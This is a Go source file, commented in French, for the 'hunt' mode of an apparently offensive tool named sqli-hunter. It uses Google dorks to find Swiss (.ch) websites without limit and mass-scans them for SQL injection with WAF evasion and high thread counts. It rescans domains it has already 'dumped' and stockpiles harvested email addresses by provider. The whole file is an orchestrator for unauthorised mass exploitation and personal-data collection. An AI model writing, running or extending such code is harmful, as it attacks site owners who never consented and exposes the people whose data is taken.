package main

import (
	"context"
	"errors"
	"fmt"
	"os"
	"os/signal"
	"path/filepath"
	"strconv"
	"syscall"

	"github.com/sqli-hunter/sqli-hunter/internal/discover"
	"github.com/sqli-hunter/sqli-hunter/internal/notify"
	"github.com/sqli-hunter/sqli-hunter/internal/output"
	"github.com/sqli-hunter/sqli-hunter/internal/results"
)

const huntScopeFile = "scope_hunt.txt"

// runHunt — discover + scan manuel (.ch), cycle 1–4 semaines sur le catalogue dorks.
func runHunt(args []string) {
	cfg, cycleWeeks, err := parseHuntArgs(args)
	if err != nil {
		fmt.Fprintf(os.Stderr, "erreur: %v\n", err)
		os.Exit(1)
	}

	dorkTotal := len(discover.BuildBigDorks("ch", true))
	pagesPerRun := discover.MaxPagesPerRun(cycleWeeks, dorkTotal)

	printer := output.New(cfg.noColor, cfg.verbose)
	printer.Header(version)
	printer.KV("mode", "hunt — discover + scan (.ch)")
	printer.KV("discover", fmt.Sprintf("%d dorks vuln + DBMS/WAF", dorkTotal))
	printer.KV("cycle", fmt.Sprintf("%d semaine(s) · %d dorks/passe", cycleWeeks, pagesPerRun))
	printer.KV("limit", discoverLimitLabel(cfg.discoverLimit))
	printer.KV("threads", fmt.Sprintf("scan %d · urls %d · extract %d", cfg.threads, cfg.urlConcurrency, cfg.extractThreads))
	printer.KV("scan", "full + waf + rescan domaines dumpés")
	printer.KV("output", cfg.outputDir+"/emails/")
	printer.Rule()
	fmt.Println()

	n := notify.Default()
	notify.BoardLaunch(n)
	if n.Enabled() {
		n.DiscoverProgress("discover", 0, dorkTotal, 0, 0, 0)
	}
	_ = results.WriteRunStatus(cfg.outputDir, results.RunStatus{Phase: "hunt"})

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigCh
		printer.Warning("interruption")
		cancel()
	}()

	cfg.discoverDomain = "ch"
	cfg.discoverSource = "google"
	cfg.discoverSubs = true
	cfg.discoverOutput = filepath.Join(cfg.outputDir, huntScopeFile)
	cfg.skipScanned = false
	cfg.rescan = true
	cfg.allowEmptyDiscover = true
	cfg.huntScan = true
	cfg.cycleWeeks = cycleWeeks
	cfg.scanAfterDiscover = true

	scopePath, count, err := discoverURLs(ctx, cfg, printer)
	if err != nil {
		if n.Enabled() {
			msg := err.Error()
			if errors.Is(err, context.Canceled) {
				msg = "discover interrompu (stop ou redémarrage)"
			}
			n.Error("Discover hunt: " + msg)
		}
		printer.Error(err.Error())
		os.Exit(1)
	}
	if count == 0 {
		printer.Warning("Aucune URL sur cette passe — curseur avancé pour la prochaine")
		printEmailStock(printer, cfg.outputDir)
		return
	}

	cfg.listFile = scopePath
	applyMassDefaultsToConfig(&cfg, count)
	cfg.massMode = true
	if cfg.progressEvery <= 0 {
		cfg.progressEvery = 200
	}

	if err := executeScan(ctx, cfg, printer); err != nil {
		if n.Enabled() {
			n.Error("Scan hunt: " + err.Error())
		}
		printer.Error(err.Error())
		os.Exit(1)
	}

	printEmailStock(printer, cfg.outputDir)
}

func printEmailStock(printer *output.Printer, outputDir string) {
	list, err := results.ListProviders(outputDir)
	if err != nil || len(list) == 0 {
		return
	}
	printer.Rule()
	fmt.Println()
	printer.KV("stock emails", "")
	for _, p := range list {
		fmt.Printf("  • %s — %d\n", p.Provider, p.Count)
	}
}

func discoverLimitLabel(n int) string {
	if n <= 0 {
		return "illimité"
	}
	return fmt.Sprintf("%d urls", n)
}

func parseHuntArgs(args []string) (config, int, error) {
	cycleWeeks := discover.CycleWeeksFromEnv()
	var passthrough []string
	for i := 0; i < len(args); i++ {
		arg := args[i]
		if arg == "--cycle-weeks" {
			i++
			if i >= len(args) {
				return config{}, 0, fmt.Errorf("--cycle-weeks nécessite une valeur (1-4)")
			}
			n, err := strconv.Atoi(args[i])
			if err != nil || n < 1 || n > 4 {
				return config{}, 0, fmt.Errorf("--cycle-weeks doit être entre 1 et 4")
			}
			cycleWeeks = n
			continue
		}
		passthrough = append(passthrough, arg)
	}
	cycleWeeks = discover.ClampCycleWeeks(cycleWeeks)

	scanArgs := append([]string{
		"-D", "ch", "--mass", "--full", "--waf", "--rescan",
		"-t", "sqli,error,union,boolean,time",
		"--url-threads", "96",
		"--threads", "12",
		"--extract-threads", "6",
		"--progress-every", "200",
	}, passthrough...)
	cfg, err := parseArgs(scanArgs)
	if err != nil {
		return cfg, cycleWeeks, err
	}
	cfg.discoverLimit = 0
	return cfg, cycleWeeks, nil
}
